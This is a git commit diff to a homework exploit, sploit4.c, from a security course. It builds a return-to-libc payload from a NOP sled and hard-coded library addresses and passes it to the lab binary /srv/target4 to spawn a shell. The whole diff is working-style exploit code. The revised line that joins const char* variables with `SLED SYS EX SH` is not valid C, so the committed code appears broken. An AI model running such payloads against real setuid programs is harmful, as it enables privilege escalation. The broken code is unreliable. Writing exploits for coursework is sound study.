38663498e884e4ee1512a79b89a2d51d568f699b
justinhalford <justinhalford@gmail.com>
2024-05-10 20:47:15 -0400

    may 7

--- cs5435-hw4/sploits/sploit4.c
+++ cs5435-hw4/sploits/sploit4.c
@@ -4,23 +4,23 @@
 #include <string.h>
 #include <unistd.h>
 #include "shellcode.h"
-
-#define TARGET "/srv/target4"
+const char* TARGET = "/srv/target4";
+const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90";
+const char* SYS = "\x60\x43\xe1\xf7";
+const char* EX = "\xc0\x6e\xe0\xf7";
+const char* SH = "\x63\xf3\xf5\xf7";
 
 int main(void)
 {
   char *args[3];
-  char *env[2];
+  char *env[1];
 
+  
   args[0] = TARGET;
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90"
-            "\x60\x43\xe1\xf7"
-            "\xc0\x6e\xe0\xf7"
-            "\x63\xf3\xf5\xf7";
+  args[1] = SLED SYS EX SH;
   args[2] = NULL;
 
-  env[0] = "/bin/zsh";
-  env[1] = NULL;
+  env[0] = NULL;
 
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
